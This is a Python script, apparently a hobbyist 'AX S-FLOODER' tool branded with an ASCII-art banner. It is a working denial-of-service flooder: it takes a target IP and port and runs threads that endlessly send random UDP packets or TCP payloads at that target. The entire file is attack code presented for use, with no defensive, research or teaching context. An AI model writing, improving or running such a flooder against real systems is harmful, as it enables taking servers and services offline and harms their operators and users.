#!/usr/bin/env python3
#Code by Khalid Mahmud
import argparse
import random
import socket
import threading

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=99999, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=7, help="Threads")
args = vars(ap.parse_args())

print("--> Created BY Team AX <--")
print("#-- AX SERVER FREEZE --#")
print("\033[96m" + """

 .d8b.  db    db      .d8888.        d88888b db       .d88b.   .d88b.  d8888b. d88888b d8888b. 
d8' `8b `8b  d8'      88'  YP        88'     88      .8P  Y8. .8P  Y8. 88  `8D 88'     88  `8D 
88ooo88  `8bd8'       `8bo.          88ooo   88      88    88 88    88 88   88 88ooooo 88oobY' 
88~~~88  .dPYb.         `Y8b. C8888D 88~~~   88      88    88 88    88 88   88 88~~~~~ 88`8b   
88   88 .8P  Y8.      db   8D        88      88booo. `8b  d8' `8b  d8' 88  .8D 88.     88 `88. 
YP   YP YP    YP      `8888Y'        YP      Y88888P  `Y88P'   `Y88P'  Y8888D' Y88888P 88   YD 
                                                                                               
                                                                                               
""" + "\033[91m" + """
                                                                                                                
                                                                                                                
                                                                                                                
""" + "\033[0m")


print("Super Fast And Accurate")

ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("\033[92m" + i + " ATTACK STARTED BY AX S-FLODER!!!!\033[0m")
		except:
			print("\033[91m[!] AN UNKNOWN ERROR OCCURRED!!!\033[0m")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\033[92m" + i + " ATTACK STARTED BY AX S-FLODER!!!!\033[0m")
		except:
			s.close()
			print("\033[91m[!] AN UNKNOWN ERROR OCCURRED!!!\033[0m")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()